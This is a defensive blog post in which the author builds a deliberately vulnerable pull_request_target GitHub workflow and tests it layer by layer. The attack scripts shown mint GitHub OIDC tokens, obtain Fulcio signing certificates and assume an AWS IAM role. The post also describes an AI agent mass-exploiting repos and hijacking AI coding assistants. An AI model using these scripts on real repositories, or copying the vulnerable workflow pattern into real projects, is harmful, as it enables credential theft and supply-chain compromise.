---
date: '2026-03-20T00:00:00Z'
title: "Modeling the hackerbot-claw Attack Against My Own CI/CD Pipeline"
summary: "Reviewing my infrastructure's security posture against recent high-profile supply chain security compromises involving GitHub workflows using pull_request_target."
tags: ["GitHub Actions", "Supply Chain Security", "Sigstore", "Fulcio", "OIDC", "CI/CD", "Infrastructure Security","hackerbot-claw"]
categories: ["Engineering"]
---

## Background

I had a GitHub workflow build fail with a message regarding a hash mismatch in a pinned version of a tool I use which naturally got my attention.

```
[stage-2 10/16] RUN curl -sSL https://github.com/aquasecurity/trivy/releases/download/v0.68.2/trivy_0.68.2_Linux-64bit.tar.gz -o /tmp/trivy.tar.gz     && echo "3d933bbc3685f95ec15280f620583d05d97ee3affb66944d14481d5d6d567064  /tmp/trivy.tar.gz" | sha256sum -c -     && tar -xzvf /tmp/trivy.tar.gz -C /usr/local/bin trivy     && chmod +x /usr/local/bin/trivy:
0.297 /tmp/trivy.tar.gz: FAILED
0.297 sha256sum: WARNING: 1 computed checksum did NOT match
--------------------
ERROR: failed to build: failed to solve: process "<trimmed>" did not complete successfully: exit code: 1
Error: Process completed with exit code 1.
```

Investigating the issue it turns out the team behind trivy had a software supply chain security incident which led to their existing releases being wiped by the attacker.

While researching that [hackerbot-claw attack](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation) (great write-up at StepSecurity.io), I wanted to assess my own infrastructure against this exact same attack and see what holds up and what needs to be re-considered.

## The Vulnerability

GitHub Actions has two pull request triggers: `pull_request` and `pull_request_target`.

`pull_request` runs without access to base-repository secrets for workflows triggered from forks.

`pull_request_target` runs in the context of the base repository's default branch, not the PR's execution context. This is used for labeling and performing other actions on PRs safely. However, if the workflow checks out the PR head and runs anything from it, or unsafely interpolates PR-controlled data such as branch names into shell commands, then it becomes an attack vector. An attacker can fork your repo, put whatever they want in a build script or branch name/variable name, open a PR, and the workflow runs their code with your credentials.

In the hackerbot-claw campaign, an AI agent scanned tens of thousands of public repos looking for this exact pattern and generated tailored exploits for each target. Trivy was the worst hit - the attacker exfiltrated a PAT with broad permissions and used it to wipe every release, rename the repo, and push a malicious VSCode extension that attempted to hijack developers' local AI coding assistants to exfiltrate credentials.

The full details across all targets are in the [StepSecurity write-up](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation).

## Attacking My Infrastructure

This unintentionally ended up being a demonstration of the swiss cheese model. This is a summary of how each layer held up.

### Layer 1: Workflow Trigger

None of my repos use workflows that are triggered on pull-requests. Mine are generally triggered by pushes to tags which bypasses this vulnerability category entirely. So we held up at layer 1, but let's poke a hole here and see how the rest hold up.

In order to continue testing, I created an intentionally vulnerable repository. I created a workflow that activates using pull_request_target, and intentionally (insecurely) checks out the PR head before running a test script. In a normal case, it may be a linter or test coverage checking script, etc. Anything that is executed from within the repo and can be overridden in a pull request.

.github/workflows/pr_test.yml

``` yaml
name: Vulnerable PR Test Workflow

on:
  pull_request_target:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Install cosign so we can test against fulcio
        run: |
          # Install cosign pinned version
          curl -sSL https://github.com/sigstore/cosign/releases/download/v3.0.5/cosign-linux-amd64 -o /tmp/cosign \
            && echo "db15cc99e6e4837daabab023742aaddc3841ce57f193d11b7c3e06c8003642b2 /tmp/cosign" | sha256sum -c - \
            && chmod +x /tmp/cosign

      - name: Run code the PR can replace
        run: |
          if [ -f .github/scripts/test.sh ]; then
            bash .github/scripts/test.sh
          fi
```

.github/scripts/test.sh
``` bash
#!/bin/bash

echo "Hi this script should be reviewing PRs and doing normal safe stuff!"
```

Using my newly created intentionally vulnerable repository, a hole is poked in the first layer.

This gives the attacker arbitrary code execution in a GitHub runner within my repository's context. They can inspect the runner environment for the repo-scoped `GITHUB_TOKEN`, cached dependencies, docker layer caches, mounted volumes, and if the workflow grants `id-token: write`, request a GitHub Actions OIDC ID token. In my environment the `GITHUB_TOKEN` itself has limited value because I do not rely on stored long-lived GitHub secrets for downstream access, the more interesting credential is the OIDC ID token, because that is what can be presented to AWS IAM or Fulcio.

The path for the attacker is straightforward: fork the repo (or create a branch to test against your own private repo), replace the .github/scripts/test.sh script with a malicious version, submit a pull-request, profit.

Something like this:

.github/scripts/test.sh (forked repo) 
``` bash
#!/bin/bash

echo "Oh no, now test.sh does unsafe things!"
```

### Layer 2: Network Firewall

The services GitHub interacts with in my infrastructure are firewalled to allow only GitHub workflow IP addresses. Simply exfiltrating the `GITHUB_TOKEN` is not the interesting path here as it does not chain into further compromise. The more valuable target is a GitHub Actions OIDC ID token, because that is the credential involved in federated signing and IAM role assumption.

Creating a more customized pull-request attack, the attacker would request a GitHub Actions OIDC ID token and reach out to downstream services that trust GitHub OIDC. Because the malicious code is executing inside a GitHub-hosted workflow, the request originates from GitHub's network and passes the firewall layer.

This is a sample replacement script that extracts the GitHub OIDC ID token, and also uses cosign to sign an arbitrary blob using a fulcio certificate.

.github/scripts/test.sh (forked repo)
``` bash
#!/bin/bash

# Request OIDC ID token from github
OIDC_TOKEN=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" | jq -r '.value')

# Decode and inspect the GitHub OIDC ID token
if [[ -n "${OIDC_TOKEN}" ]];then
  echo "Got OIDC Token!"
  echo "$OIDC_TOKEN" | cut -d . -f 2 | base64 -d 2>/dev/null | jq .
else
  echo "Failed to get OIDC token - workflow missing permissions.id-token: write?"
fi

# Create arbitrary blob to sign, attacker would place their malicious binary/whatever
# file they want a valid signed bundle for here instead of a text file
echo "signmyreallylegitfileplease" > /tmp/test.txt

# signing-config.json and trusted_root.json configure cosign to use
# my self-hosted fulcio, rekor, and timestamp-authority instances
# rather than the public sigstore infrastructure. you can leave those
# arguments off

# Sign using the workflow's OIDC identity
echo "Signing test bundle"
/tmp/cosign sign-blob \
  --signing-config=signing-config.json \
  --trusted-root=trusted_root.json \
  --bundle=/tmp/test-bundle.json \
  --yes /tmp/test.txt
```

This is a sample GitHub OIDC ID token with `audience=sigstore` returned from that step. We will use to request a cert from Fulcio.

```
{
  "actor": "keithlinneman",
  "actor_id": "210238713",
  "aud": "sigstore",
  "base_ref": "main",
  "check_run_id": "67857121063",
  "event_name": "pull_request_target",
  "exp": 1773981585,
  "head_ref": "really-legit-definitely-not-stealing-iam-creds",
  "iat": 1773981285,
  "iss": "https://token.actions.githubusercontent.com",
  "job_workflow_ref": "linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main",
  "job_workflow_sha": "8e120373067b721c1dbc7bf93fec8df566659b41",
  "jti": "84095334-d00a-4944-a72b-bea17ab09811",
  "nbf": 1773980985,
  "ref": "refs/heads/main",
  "ref_protected": "false",
  "ref_type": "branch",
  "repository": "linnemanlabs/pull-request-leaks",
  "repository_id": "1185972908",
  "repository_owner": "linnemanlabs",
  "repository_owner_id": "263236737",
  "repository_visibility": "private",
  "run_attempt": "1",
  "run_id": "23329218059",
  "run_number": "13",
  "runner_environment": "github-hosted",
  "sha": "8e120373067b721c1dbc7bf93fec8df566659b41",
  "sub": "repo:linnemanlabs/pull-request-leaks:pull_request",
  "workflow": "Vulnerable PR Test Workflow",
  "workflow_ref": "linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main",
  "workflow_sha": "8e120373067b721c1dbc7bf93fec8df566659b41"
}
```

The key values that map to cosign flags and IAM conditions are:

| OIDC Key | Value | cosign flag | IAM checked |
|-----|---------|--------|-------|
| iss | https://token.actions.githubusercontent.com | --certificate-oidc-issuer | Yes (provider trust) |
| sub | repo:linnemanlabs/pull-request-leaks:pull_request| - | Yes (StringLike) |
| aud | sigstore or sts.amazonaws.com | - | Yes (StringEquals) |
| event_name | pull_request_target | --certificate-github-workflow-trigger | No |
| workflow | Vulnerable PR Test Workflow | --certificate-github-workflow-name | No |
| job_workflow_ref | linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main | --certificate-identity-regexp | No |
| ref | refs/heads/main | --certificate-github-workflow-ref | No |
| repository | linnemanlabs/pull-request-leaks | --certificate-github-workflow-repository | No |

This is a relatively noisy attack path given each new attempt is another logged pull request, and another logged workflow execution. You could bypass some of that noise by exfiltrating the OIDC ID token, and then using your own repo workflow that you pass the token into to make the network calls, thereby allowing you to re-use that token and still send it from GitHub's network without the noise of additional pull requests. You would still need to generate some amount of noise as those tokens are short-lived, so every token refresh would be another pull-request -> exfil process.

From GitHub's network, fulcio, rekor, and timestamp-authority are all reachable as they need to be accessible from the GitHub runner environment. These are the only internal services exposed to GitHub's IP range - SPIRE, observability, and application infrastructure are not reachable from this path.

### Layer 3: Load Balancer JWT Validation

This layer is planned but would not have helped here regardless. The attacker request is a valid request coming from a GitHub workflow running in my repository, which means the signed JWT from GitHub will be valid and accepted. So this layer is bypassed entirely by this specific attack.

What this would do is prevent the attacker from stealing the OIDC_TOKEN and re-using it from their own repo as described in layer 2. This forces them into the noiser, more auditable path of attacking through code they expose in the pull request. They will probably just download an external script/binary to hide their specific actions, which leads to the same reason for restricting egress from runners - force the attacker to operate entirely within the pull request contents, also prevent the OIDC_TOKEN from being exfiltrated.

This load balancer only fronts fulcio, rekor, and timestamp-authority. Traffic flows through an ALB in the ingress VPC to an NLB in the trust account, with per-application security groups restricting ingress to only the specific ports each service needs. There is no path from this load balancer to anything else in my infrastructure.

### Layer 4: Fulcio Certificate Issuance

My self-hosted fulcio is configured to trust GitHub Actions as an OIDC issuer. In that configuration, a workflow that can request a valid GitHub Actions OIDC ID token can obtain a short-lived signing certificate. Fulcio embeds workflow and repository identity into the certificate, but in my current design (due to fulcio's design) I enforce the narrow repo/workflow/ref restrictions at verification and downstream policy layers.

The certificate issuance will be logged in my tesseract certificate transparency log. This provides an audit trail that cannot be removed or bypassed. However, certificate issuance at the fulcio layer is not repo-gated in my current design, so this layer is also bypassed.

This is what the fulcio certificate looks like:
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            62:e3:12:cc:dc:1f:c9:6c:26:d1:5d:0e:9f:06:4a:e3:ac:c5:fa:75
        Signature Algorithm: ecdsa-with-SHA384
        Issuer: O = linnemanlabs.com, CN = LinnemanLabs Fulcio CA
        Validity
            Not Before: Mar 20 04:34:46 2026 GMT
            Not After : Mar 20 04:44:46 2026 GMT
        Subject: 
        Subject Public Key Info:
            Public Key Algorithm: id-ecPublicKey
                Public-Key: (256 bit)
                pub:
                    04:4d:6e:a0:d9:0f:da:2b:b2:db:48:ba:1c:0c:e2:
                    1f:82:6f:c3:e9:85:7e:2e:ec:1d:5a:a2:38:94:cf:
                    d8:82:d5:4e:5f:f3:35:37:51:3b:c2:5b:2f:b5:c1:
                    42:aa:7b:f3:a7:0a:77:ed:81:13:62:45:3d:b2:d4:
                    97:6f:8f:3b:00
                ASN1 OID: prime256v1
                NIST CURVE: P-256
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature
            X509v3 Extended Key Usage: 
                Code Signing
            X509v3 Subject Key Identifier: 
                2C:F1:16:5F:7C:CB:05:8F:73:3B:9E:06:B2:E7:FB:57:3D:DE:5F:72
            X509v3 Authority Key Identifier: 
                31:D1:46:E5:B6:D5:3B:E8:B3:A8:B0:0E:37:2E:9B:F1:E7:29:2D:00
            X509v3 Subject Alternative Name: critical
                URI:https://github.com/linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main
            1.3.6.1.4.1.57264.1.1: 
                https://token.actions.githubusercontent.com
            1.3.6.1.4.1.57264.1.2: 
                pull_request_target
            1.3.6.1.4.1.57264.1.3: 
                8e120373067b721c1dbc7bf93fec8df566659b41
            1.3.6.1.4.1.57264.1.4: 
                Vulnerable PR Test Workflow
            1.3.6.1.4.1.57264.1.5: 
                linnemanlabs/pull-request-leaks
            1.3.6.1.4.1.57264.1.6: 
                refs/heads/main
            1.3.6.1.4.1.57264.1.8: 
                .+https://token.actions.githubusercontent.com
            1.3.6.1.4.1.57264.1.9: 
                .`https://github.com/linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main
            1.3.6.1.4.1.57264.1.10: 
                .(8e120373067b721c1dbc7bf93fec8df566659b41
            1.3.6.1.4.1.57264.1.11: 
                .
github-hosted
            1.3.6.1.4.1.57264.1.12: 
                .2https://github.com/linnemanlabs/pull-request-leaks
            1.3.6.1.4.1.57264.1.13: 
                .(8e120373067b721c1dbc7bf93fec8df566659b41
            1.3.6.1.4.1.57264.1.14: 
                ..refs/heads/main
            1.3.6.1.4.1.57264.1.15: 
                .
1185972908
            1.3.6.1.4.1.57264.1.16: 
                ..https://github.com/linnemanlabs
            1.3.6.1.4.1.57264.1.17: 
                ..263236737
            1.3.6.1.4.1.57264.1.18: 
                .`https://github.com/linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main
            1.3.6.1.4.1.57264.1.19: 
                .(8e120373067b721c1dbc7bf93fec8df566659b41
            1.3.6.1.4.1.57264.1.20: 
                ..pull_request_target
            1.3.6.1.4.1.57264.1.21: 
                .Vhttps://github.com/linnemanlabs/pull-request-leaks/actions/runs/23329218059/attempts/1
            1.3.6.1.4.1.57264.1.22: 
                ..private
            CT Precertificate SCTs: 
                Signed Certificate Timestamp:
                    Version   : v1 (0x0)
                    Log ID    : 1F:10:C0:CF:38:90:44:AD:DD:71:2E:2A:D4:33:0A:4D:
                                E7:DC:8B:3F:63:B6:CB:5D:8A:AE:1E:5F:17:6B:09:5C
                    Timestamp : Mar 20 04:34:46.287 2026 GMT
                    Extensions: 00:00:05:00:00:00:00:13
                    Signature : ecdsa-with-SHA256
                                30:44:02:20:25:4E:96:63:D1:66:45:02:51:45:11:BB:
                                65:7A:EB:5B:76:31:AE:02:2B:25:6A:C8:FE:B6:76:6B:
                                A6:89:73:23:02:20:6B:AD:B1:2C:6D:54:1C:92:E5:86:
                                28:3F:BD:B2:B0:20:CA:D2:5F:F1:44:77:64:00:0E:2B:
                                54:2E:3C:C3:D5:44
    Signature Algorithm: ecdsa-with-SHA384
    Signature Value:
        30:65:02:30:04:2c:36:6a:a0:84:83:56:d7:70:a5:b3:62:5e:
        55:8d:a3:e6:36:43:a7:1a:85:64:90:de:22:7b:e5:34:dd:68:
        1a:14:d8:51:56:02:90:8d:3f:de:3c:7e:ec:d7:86:5b:02:31:
        00:f4:ff:95:b9:74:95:54:6d:ab:7a:71:f0:b9:25:8b:24:fd:
        67:a6:80:ed:50:33:c6:1a:3a:e3:96:25:c5:42:19:73:1f:29:
        69:59:c9:e9:e1:94:c6:4a:e1:87:a2:a3:5e

```

With a valid fulcio certificate they can sign artifacts using the keyless flow. The blast radius of that is covered heavily in the rest of the post already. Nothing else in my infrastructure relies on fulcio certificates.

### Layer 5: AWS IAM / KMS

My builds are all dual signed - one keyless signature using a fulcio certificate and one signature from a KMS-backed key using an assumed IAM role. In this case, the OIDC integration between AWS IAM and GitHub will hold up and block this attack.


The attacker would modify the script to request another GitHub OIDC ID token, except this time with `audience=sts.amazonaws.com` in the claims.

.github/scripts/test.sh (forked repo)
```
#!/bin/bash

AWS_OIDC_TOKEN=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')

echo "attempting to assume AWS IAM role"
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::############:role/app-pullrequest-leaks-build" \
  --role-session-name "pr-attack-test" \
  --web-identity-token "${AWS_OIDC_TOKEN}" \
  2>&1
```

The IAM role assumption policy contains:

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowGitHubOIDC",
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::############:oidc-provider/token.actions.githubusercontent.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
                },
                "StringLike": {
                    "token.actions.githubusercontent.com:sub": "repo:linnemanlabs/pull-request-leaks:ref:refs/tags/v*"
                }
            }
        }
    ]
}
```

The sub StringLike validation ensures that this will only be triggered by pushes to tagged commits and not from pull-request triggered workflows. The IAM role assumption would not be successful, which means the release will not be able to be signed by the KMS key.

Which means if the attacker modifies the script to attempt to assume this role they will be denied:

```
Error: aws: [ERROR]: An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: Not authorized to perform sts:AssumeRoleWithWebIdentity
Additional error details:
Type: Sender
```

If we intentionally opened this layer up by weakening the StringLike to only check the repo name, the attacker would be able to assume the application builder role. The IAM permissions for that role allow several things:
 - Allow access to the application-specific KMS key for signing operations
 - Allow access to assume the IAM role that is allowed to push content to ECR/S3 (moderate ouch)
 - Allow access to assume the IAM role that sets the current hash to use for the canary release channel (larger ouch)
 - Allow access to list the contents of ECR/S3

KMS key permissions on that key only allow it to be used to export the public key and sign artifacts. The specific KMS key is dedicated to one application, meaning it can only be used to sign artifacts that will pass validation for that one application.

Being able to assume the IAM role that is allowed to push content to ECR/S3 is pretty bad news. Immutable tags and S3 Object Lock prevent replacing existing content, but this is certainly something we want to prevent and can lead to a lot of headaches (could push content to future anticipated tags and prevent valid releases later, could serve as a trust signal for a social engineering campaign based on the artifacts existing in the trusted artifact store with at least 1 valid signed bundle, etc) even if it doesn't provide a direct path to code execution.

Even worse is they can assume the IAM role that sets the current hash to use for the canary release channel. This would cause newly deployed nodes to fetch that hash from S3/ECR and begin their validation process against them. They would fail validation and not be granted execution, but this would prevent newly deployed nodes from becoming operational.

I do not consider listing the ECR/S3 contents as a sensitive operation in my environment so that one is a non-issue, but the capability exists.

All of the above is only possible if we weaken the IAM condition from `"repo:linnemanlabs/pull-request-leaks:ref:refs/tags/v*"` to just the repo name `"repo:linnemanlabs/pull-request-leaks:*"`. The difference between those two strings in an IAM policy is the difference between "attacker can sign things, push artifacts, and disrupt deployments" and "attacker gets nothing" in my current environment.

Let's weaken that policy and test again:
```
{
    "Credentials": {
        "AccessKeyId": "<trimmed>>",
        "SecretAccessKey": "<trimmed>",
        "SessionToken": "<trimmed>>",
        "Expiration": "2026-03-20T05:05:29+00:00"
    },
    "SubjectFromWebIdentityToken": "repo:linnemanlabs/pull-request-leaks:pull_request",
    "AssumedRoleUser": {
        "AssumedRoleId": "<trimmed>:pr-attack-test",
        "Arn": "arn:aws:sts::############:assumed-role/app-pullrequest-leaks-build/pr-attack-test"
    },
    "Provider": "arn:aws:iam::############:oidc-provider/token.actions.githubusercontent.com",
    "Audience": "sts.amazonaws.com"
}
```

Now we have valid access credentials for IAM and can proceed to the next layers.

### Layer 6: AWS IAM / Push Content To Artifact Stores

This is covered in the Layer 5 lateral analysis above. The same IAM role assumption that gates KMS access also gates S3 and ECR push access with the same tag-scoped condition. With that condition intact, the attacker cannot push artifacts anywhere.

With the weakened IAM condition from Layer 5, they can push content. Immutable ECR tags and S3 Object Lock prevent replacing existing artifacts but as covered above, the ability to push new content still creates real problems.

### Layer 7: Mark Content For Release

Also covered in the Layer 5 lateral analysis. The same IAM role gates access to set the current canary/stable release hash. With the tag-scoped condition intact, this is blocked.

With the weakened condition, the attacker can point the canary channel at their artifact. Newly deployed nodes would fetch it, fail validation at Layer 8, and not become operational. Not code execution, but an effective denial of service against new deployments.

The future TUF distribution system will add an independent gate here that does not rely on the same IAM role, breaking the single point of failure where one weakened IAM condition cascades through Layers 5, 6, and 7, and will also gate promoting a release on independent verification of scans, sboms, attestations, etc, which wouldn't exist for an artifact that bypassed the build pipeline.

### Layer 8: Deploy-time Bundle Verification

So far an attacker has been able to generate a signed bundle, push the artifact to our store, and mark its hash as the current canary release. The last gate is at deployment time.

Two signed bundles are expected: a keyless fulcio bundle and a KMS-backed bundle.

First, my cosign verify-blob flow checks against a trusted_root.json containing public key/certificate material of our trust infrastructure and an application-specific pubkey baked into the golden AMI at image build time. That pubkey corresponds to the KMS private key used for signing that specific application's artifacts. The attacker was not able to generate a KMS-signed bundle in the earlier steps, so this check fails and execution is prevented. This layer holds.

Following the same approach of poking holes, let's remove the KMS verification and see if the keyless verification holds. My cosign verify-blob flow for keyless signatures uses:

``` 
--certificate-oidc-issuer="https://token.actions.githubusercontent.com"
--certificate-identity-regexp="^https://github\.com/linnemanlabs/pull-request-leaks/.github/workflows/build\.yml@refs/tags/v.*$"
--certificate-github-workflow-trigger="push"
--certificate-github-workflow-repository="linnemanlabs/pull-request-leaks"
--certificate-github-workflow-name="Build App"
```

Let's run cosign verify-blob against the keyless bundle and see if it verifies:

```
Error: failed to verify certificate identity: no matching CertificateIdentity found, last error: expected SAN value to match regex "^https://github\.com/linnemanlabs/pull-request-leaks/.github/workflows/build\.yml@refs/tags/v.*$", got "https://github.com/linnemanlabs/pull-request-leaks/.github/workflows/pr_test.yml@refs/heads/main"
```

This also prevents verification and execution. The workflow-trigger would not match "push", the certificate-identity-regexp would not match the ref, and the workflow-name would not match. Each of these independently would prevent verification.

Many examples of keyless verification stop at issuer plus certificate identity. That requires pinning the identity very narrowly. But for GitHub actions, Cosign also exposes GitHub-specific certificate checks for workflow trigger, repository, ref, workflow name, and git commit SHA. If you rely on CLI verification the way I do, I recommend enforcing as much of that workflow context as possible rather than trusting issuer and identity alone.

Let's weaken each of our protections one at a time and see the error message change.

First, `certificate-identity-regexp`, If we weaken this to only check that it is a workflow in our repo, we change:

```
--certificate-identity-regexp="^https://github\.com/linnemanlabs/pull-request-leaks/.github/workflows/build\.yml@refs/tags/v.*$"
````
to
```
--certificate-identity-regexp="^https://github\.com/linnemanlabs/pull-request-leaks/.github/workflows/.*$"
```

Now we get:
```
Error: failed to verify certificate identity: no matching CertificateIdentity found, last error: expected GithubWorkflowTrigger to be "push", got "pull_request_target"
```

The workflow trigger check holds. Next, let's remove that `certificate-github-workflow-trigger` protection. Now we get:
```
Error: failed to verify certificate identity: no matching CertificateIdentity found, last error: expected GithubWorkflowName to be "Build App", got "Vulnerable PR Test Workflow"
```

The workflow name check holds. Last, let's remove that protection. Now we get:
```
Verified OK
```

Game over. At this point the binary would be configured and executed. In TLS terms, this is the difference between “the certificate chains to a trusted CA” and “the certificate chains to a trusted CA and its SAN matches the identity I intended”. Keyless signing needs that same second step.

There is no lateral surface here. Verification is a read-only operation against locally stored public keys and a remotely fetched bundle from a pre-defined artifact store with the only variable input being the artifact hash. A failed verification produces a log entry and the node does not become operational.

## Results

| Layer | Control | Result | Notes |
|-------|---------|--------|-------|
| 1 | Workflow Trigger | **Held** | No pull_request_target workflows in use |
| 2 | Network Firewall | Bypassed | Attacker runs from GitHub's network |
| 3 | Load Balancer JWT | Bypassed | Valid JWT from legitimate workflow |
| 4 | Fulcio Certificate | Bypassed | Issues certs to any valid GitHub OIDC ID token |
| 5 | AWS IAM / KMS | **Held** | OIDC sub claim rejects non-tag refs |
| 6 | Artifact Store Push | **Held** | Same IAM scoping as Layer 5 |
| 7 | Release Channel | **Held** | Requires same IAM role |
| 8 | Deploy-time Verification | **Held** | KMS pubkey check + keyless cert attribute validation |

*Layers marked "Bypassed" were intentionally continued past to test remaining depth. In practice, Layer 1 stops this attack entirely.*

## Detection

Even with the multiple holes we had to intentionally poke in our infrastructure to test this, things held up at each successive step. There would be a large noisy audit trail associated with these events as well:
 - tesseract certificate transparency logs of each fulcio certificate
 - rekor transparency logs of each artifact that is signed with the keyless certificate
 - failed AWS IAM role assumption attempts
 - failed attempts to push artifacts to S3/ECR and update the stable/canary release channels
 - fulcio certificate issuance that expired without ever being tied to a rekor transparency log entry, meaning something requested a signing certificate and then never signed anything
 - rekor entries for a signed binary that never got pushed to S3/ECR
 - rekor entries for a hash that never entered the canary/stable release pipeline
 - artifact pushed to S3/ECR with no associated KMS-backed signature bundle
 - GitHub pull requests produce their own audit trail tied to the account opening them and the forked repo, stored in GitHub's infrastructure
 - GitHub pull request opened with malicious content inside of it (be careful scanning for malicious content with LLMs.. that's a whole other rabbit hole on prompt injection)

Any properly tuned security system and anomaly investigation system is going to get triggered by any one of these individually, and with this amount of rich context to pull from, a very conclusive picture can be put together quickly.

### Future Hardening with eBPF Gated Binary Hashes

I have been wanting to build a 'trusted-runner' for quite a while now. A very brief summary of one of the relevant features here would be it contains a continuously updated list of binary hashes approved for execution in my environment. That list is based on the artifacts that made it through all the previous gates and were approved for release into my environment. At any given time a rolling window of only the most recent builds of any application are marked as approved for execution.

This would allow for a revocation mechanism that any of my other systems can interface with, e.g. an anomaly investigation process can flag the fact this binary is missing a KMS signature bundle, or that the IAM role assumption failed, and mark this binary as unauthorized for execution in my environment.

The trusted-runner operates at the eBPF level and can instantly kill any binaries with that hash, and prevent any future execution at the kernel level, and emit relevant observability telemetry.

### Future Detection with AI-Assisted Triage

I built [vigil](https://github.com/linnemanlabs/vigil) to perform triage on Alertmanager alerts. Those are largely infrastructure/ops alerts today. I will be expanding Vigil to ingest security/anomaly alerts and perform investigations using tool calls similar to the current infrastructure triage.

### Additional Improvements
Cosign provides two interesting command line arguments:

```
    --certificate-github-workflow-sha='':
        contains the sha claim from the GitHub OIDC Identity token that contains
        the commit SHA that the workflow run was based upon.

    --certificate-github-workflow-ref='':
        contains the ref claim from the GitHub OIDC Identity token that contains the git ref that the workflow run was
        based upon.

```

Using this I can bind the fulcio certificate to the specific commit that triggered the workflow. Without it, a legitimately issued fulcio certificate could theoretically sign any release version of this application.

This is a minimal impact threat, other layers prevent this from being exploitable today - immutable ECR tags and S3 Object Lock prevent artifact replacement, IAM prevents unauthorized pushes. However, you never know what will get through in the future, our layered approach means making this hole as small as possible to minimize likelihood it ever lines up with a future hole in another layer, e.g. an ECR misconfiguration that makes tags mutable. Enforce every piece of context you are able to at each layer.

## Conclusion

Each layer has intentional holes - the firewall has a hole for GitHub, IAM intentionally allows push access once the build role is assumed, etc. But each layer serves a vital purpose and is valuable as part of the larger system. Most pieces of any system are not aware of the entire context and handle their slice well, it is up the design to ensure they are as restrictive as possible with all of the context they understand at each step.

IAM, cosign, keyless signature, as well as KMS-backed signatures are each capable of strong security enforcement here, each with independent strengths, each with independent intentional holes and potential weaknesses if misconfigured. They combine for a pretty strong security story. By using the dual-signing approach I can hedge and build redundant protections against a misconfiguration or compromise of fulcio or KMS, or a mistake in the OIDC implementation in either the AWS to GitHub OIDC integration or the fulcio to GitHub OIDC integration that results in certificate issuance or signing. This also provides additional gates at the build/release time and not just at deployment verification time.

I see the 'zero-trust' concept mentioned frequently in terms of pushing trust somewhere other than a network perimeter. I think it needs to be taken more literally. Every boundary and interaction in a system should validate and verify everything it needs to make a secure decision - and if it doesn't have enough context to make that decision, that's a design problem to solve.

## tl;dr

 - Don't store PATs in GitHub
 - Don't use long-lived credentials
 - Do use ephemeral identity-based access
 - Do use tightly-scoped claims
 - Do enforce every piece of context that is understood at each boundary
 - Do validate fulcio certificate attributes (workflow-trigger, certificate-identity-regexp, certificate-github-workflow-sha, certificate-github-workflow-ref, certificate-github-workflow-name) at verify time, not just issuer and repository
 - Do question if the available context is sufficient